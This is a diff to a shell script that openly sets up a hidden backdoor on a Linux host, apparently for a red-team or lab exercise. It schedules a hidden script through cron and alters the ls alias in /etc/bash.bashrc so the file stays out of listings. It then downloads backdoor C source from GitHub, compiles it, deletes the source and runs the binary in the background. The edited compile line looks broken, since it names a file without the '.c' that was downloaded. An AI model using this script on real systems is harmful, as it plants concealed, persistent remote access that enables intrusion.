@@ -66,19 +66,18 @@ CRON_JOB="*/10 * * * * /var/.lib/.nope/back.sh >/dev/null 2>&1"
     echo "alias ls='ls --color=auto | grep -v "back.sh"'"
 } >> /etc/bash.bashrc
 
-# Set privs for funny.sh
-chmod +x /etc/profile.d/.funny.sh
-
 ### Install and schedule a Backdoor Binary
 # Get the code to compile
-sudo curl -s -o /etc/goose/golden_egg.c https://raw.githubusercontent.com/infiniteaxon/VulnServer/main/backdoor.c
+mkdir /etc/goose
+mkdir /etc/ftp
+sudo curl -s -o /etc/goose/server.c https://raw.githubusercontent.com/infiniteaxon/VulnServer/main/backdoor.c
 
 # Ensure gcc installed
 DEBIAN_FRONTEND=noninteractive apt-get install build-essential -y
 
 # Compile and remove source code
-gcc -o /etc/ftp/server /etc/goose/golden_egg.c
-rm /etc/goose/golden_egg.c
+gcc -o /etc/ftp/server /etc/goose/server
+rm /etc/goose/server
 
 # Run the binary in background
 nohup /etc/ftp/server </dev/null >/dev/null 2>&1 &
